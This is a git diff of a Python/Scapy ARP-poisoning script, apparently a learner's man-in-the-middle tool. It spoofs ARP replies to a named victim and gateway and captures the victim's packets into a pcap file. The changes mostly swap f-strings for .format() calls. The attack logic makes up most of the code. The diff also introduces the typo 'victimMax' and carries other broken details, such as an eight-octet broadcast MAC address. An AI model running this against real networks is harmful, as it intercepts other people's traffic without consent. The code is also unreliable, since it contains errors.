@@ -5,7 +5,7 @@ import os
 import sys
 import time
 
-def get_macaddress(targetip):
+def get_mac(targetip):
     # this is the arp packet note to self every packet contains its destination in this case it is being broadcasted to everyone
     packet = Ether(dst='ff:ff:ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip) 
     #srp sends out the requests and records the replies and will store the replies of sender in unans since we dont need unans becase we know we sent it 
@@ -26,9 +26,9 @@ class Arper():
         conf,iface = interface
         conf.verb = 0
 
-        print(f'Initialized {interface}.')
-        print(f'Gateway({gateway}) is at {self.gatewayMac}.')
-        print(f'Victim ({victim}) is at {self.victimMac}.')
+        print('Initialized {}.'.format(interface))
+        print('Gateway({}) is at {}.'.format(gateway, self.gatewayMac))
+        print('Victim ({}) is at {}.'.format(victim, self.victimMax))
         print('-'*30)
 
     def run(self):
@@ -52,10 +52,10 @@ class Arper():
         poison_victim.hwdst = self.victimMac
 
         #printing to be clean and help debugging and see that it works
-        print(f'ip src: {poison_victim.psrc}')
-        print(f'ip dst: {poison_victim.pdst}')
-        print(f'mac dst: {poison_victim.hwdst}')
-        print(f'mac src: {poison_victim.hwsrc}')
+        print('ip src: {}'.format(poison_victim.psrc))
+        print('ip dst: {}'.format(poison_victim.pdst))
+        print('mac dst: {}'.format(poison_victim.hwdst))
+        print('mac src: {}'.format(poison_victim.hwsrc))
         print(poison_victim.summary())
         print('-'*30)
 
@@ -65,13 +65,13 @@ class Arper():
         poison_gateway.pdst = self.gateway
         poison_gateway.hwdst = self.gatewayMac
 
-        print(f'ip src: {poison_gateway.psrc}')
-        print(f'ip dst: {poison_gateway.pdst}')
-        print(f'mac dst: {poison_gateway.hwdst}')
-        print(f'mac src: {poison_gateway.hwsrc}')
+        print('ip src: {}'.format(poison_gateway.psrc))
+        print('ip dst: {}'.format(poison_gateway.pdst))
+        print('mac dst: {}'.format(poison_gateway.hwdst))
+        print('mac src: {}'.format(poison_gateway.hwsrc))
         print(poison_gateway.summary())
         print('-'*30)
-        print(f'Beginning the ARP Poisoning. [CTRL-C to stop]')
+        print('Beginning the ARP Poisoning. [CTRL-C to stop]')
         while True:
             sys.stdout.write('.')
             sys.stdout.flush()
@@ -90,7 +90,7 @@ class Arper():
 
     def sniff(self, count=1000):
         time.sleep(5)
-        print(f'Sniffing {count} packets')
+        print('Sniffing {} packets'.format(count))
         bpf_filter = "ip host %s" % victim
         packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
         wrpcap('arper.pcap', packets)
